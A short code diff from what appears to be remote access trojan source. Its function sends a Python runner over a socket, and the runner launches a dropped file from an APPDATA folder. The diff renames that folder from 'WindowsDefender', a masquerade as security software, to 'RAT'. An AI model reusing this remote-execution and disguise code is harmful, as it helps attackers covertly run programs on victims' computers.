@@ -112,7 +112,7 @@ def send_runner_code(filename):
     if not s:
         return
     runner = f"""import os
-os.startfile(os.path.join(os.path.join(os.getenv('APPDATA'), "WindowsDefender"), "{filename}"))
+os.startfile(os.path.join(os.path.join(os.getenv('APPDATA'), "RAT"), "{filename}"))
 """
     send_data(s, runner.encode(), "runner.py")
     s.close()
